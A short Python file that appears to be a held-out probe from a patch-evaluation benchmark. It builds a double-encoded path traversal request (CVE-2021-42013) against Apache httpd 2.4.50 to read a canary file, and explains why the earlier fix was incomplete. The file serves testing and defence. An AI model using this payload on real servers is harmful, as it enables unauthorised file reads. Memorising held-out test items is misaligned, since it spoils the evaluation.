#!/usr/bin/env python3
"""[HELD-OUT] CVE-2021-42013 residual exploit — double-encoded path traversal.

The CVE-2021-41773 fix (patch.diff) only taught ap_normalize_path to collapse a
`.%2e` where the SECOND dot is a literal `%2e`. It still decodes `%%32%65`
("%2e" -> ".") in an EARLIER pass, so a fully double-encoded `..` slips past the
new segment check. This residual is exactly what CVE-2021-42013 reports.

Contract: reaches the canary (flag) on V1 (httpd 2.4.50) => the case is a
legitimate incomplete-patch positive. Closed on V2 (httpd 2.4.51).

NEVER exposed to the system-under-test (held out under _heldout/).
"""
from __future__ import annotations

# Double-encoding: `%%32%65` -> `%2e` (first pass) -> `.` (second pass).
# Same 4 dot-dot segments to the filesystem root, then /canary.txt.
SEG = "%%32%65%%32%65"
PATH = f"/pub/{SEG}/{SEG}/{SEG}/{SEG}/canary.txt"


def candidate() -> dict:
    return {"probe_id": "cve-2021-42013-double-encoded", "method": "GET", "path": PATH}


if __name__ == "__main__":
    print(candidate()["path"])
